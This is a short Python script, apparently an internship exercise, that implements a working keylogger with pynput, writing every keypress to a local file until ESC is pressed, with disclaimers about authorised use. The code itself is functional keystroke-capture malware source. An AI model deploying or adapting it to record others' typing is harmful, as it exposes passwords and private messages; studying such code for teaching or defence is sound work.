#!/usr/bin/env python3
"""
Simple Keylogger (Educational Use Only)
----------------------------------------
Author: Rif (Internship Task)
Note:
    - This keylogger is for educational and authorized testing purposes ONLY.
    - Running it without consent on someone else's device is ILLEGAL.
    - Always get written permission before testing.

Description:
    - Records keys pressed on the keyboard
    - Saves them to a log file (keylog.txt)
"""

from pynput import keyboard
import os

LOG_FILE = "keylog.txt"

def write_to_file(key_str: str):
    """Appends the key string to the log file."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(key_str)

def on_press(key):
    """Handles key press events."""
    try:
        # If it's a regular character
        write_to_file(key.char)
    except AttributeError:
        # Special keys (space, enter, shift, etc.)
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n")
        else:
            write_to_file(f" [{key.name}] ")

def on_release(key):
    """Stops the keylogger when ESC is pressed."""
    if key == keyboard.Key.esc:
        print("\n🛑 Keylogger stopped.")
        return False

def main():
    print("=== Simple Keylogger ===")
    print("Press ESC to stop logging.")
    print(f"Logging to: {os.path.abspath(LOG_FILE)}")

    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()

